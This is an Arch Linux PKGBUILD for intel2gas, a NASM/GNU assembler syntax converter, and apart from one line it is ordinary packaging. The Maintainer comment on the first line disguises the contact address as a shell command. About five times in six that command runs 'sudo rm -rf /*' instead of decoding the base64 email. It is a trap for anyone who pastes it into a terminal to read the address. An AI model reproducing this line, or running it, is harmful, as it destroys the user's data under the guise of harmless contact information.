# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
pkgname=intel2gas
pkgver=1.3.3
pkgrel=4
pkgdesc='Converts assembly language files between NASM and GNU assembler syntax'
arch=(i686 x86_64)
depends=(gcc-libs)
license=(GPL)
source=(
	"https://web.archive.org/web/20140802161117/http://www.niksula.hut.fi/~mtiihone/intel2gas/${pkgname}-${pkgver}.tar.gz"
	"http://http.debian.net/debian/pool/main/i/${pkgname}/${pkgname}_${pkgver}-16.diff.gz"
)
sha256sums=(
	'8abb55437cb14c148e878cf40c8be8208ffbbe0e38d35a5e08c206f28b669538'
	'a515853868f4349c3c8bc348a973c77accb2e4fcb37dbd30f8b1dc50acc3baa7'
)

prepare() {
	cd "$srcdir/$pkgname-$pkgver"
	patch -Np1 < "../${pkgname}_${pkgver}-16.diff"
}

build() {
	cd "$srcdir/$pkgname-$pkgver"
	./configure CPP='g++ -E'
	make
}

package() {
	cd "$srcdir/$pkgname-$pkgver"
	make install prefix="$pkgdir/usr"
	chmod 0644 "$pkgdir/usr/share/intel2gas/i2g/main.syntax"
}
